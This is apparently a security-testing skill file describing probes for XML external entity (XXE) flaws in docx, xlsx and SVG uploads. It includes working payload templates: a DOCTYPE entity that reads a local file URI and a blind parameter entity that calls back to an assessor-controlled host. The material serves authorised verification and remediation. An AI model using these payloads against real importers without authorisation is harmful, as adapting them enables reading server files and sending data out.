# Diagnostic Verification Probes and Code Patterns

> Sub-skill: [`xxe-ooxml-and-svg`](SKILL.md) | Family: **Web and Application**

Non-destructive verification probes owned by `xxe-ooxml-and-svg`. Record a benign baseline first; every class below is chosen so the response differs only when the weakness is present.

## Verification Classes

### OOXML part entity (in-band marker)

**Expected differential:** a DOCTYPE in word/document.xml returns a benign marker through the importer that a clean document did not produce

```text
xxeooxml repack docx with word/document.xml beginning: <!DOCTYPE d [<!ENTITY m SYSTEM "file:///tmp/xxeooxml-marker.txt">]> and reference &m; in a run
```

### SVG prolog entity

**Expected differential:** a DOCTYPE in the SVG prolog dereferences when the file is thumbnailed, surfacing the marker or a callback

```text
<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY m SYSTEM "file:///tmp/xxeooxml-svg-marker.txt">]><svg xmlns="http://www.w3.org/2000/svg"><text>&m;</text></svg>
```

### Spreadsheet part callback (blind)

**Expected differential:** an entity in xl/workbook.xml triggers a callback from the ingestion pipeline when the upload path returns nothing in-band

```text
xxeooxml repack xlsx with xl/workbook.xml declaring a parameter entity to http://<assessor-controlled-host>/xxeooxml-xlsx
```

## Usage Rules

- Send one probe class at a time and keep the benign control request identical in every other respect.
- Stop at the first differential that proves the invariant is missing; do not escalate within the same request.
- Every confirmed class maps to the structural remediation in [`SKILL.md`](SKILL.md).
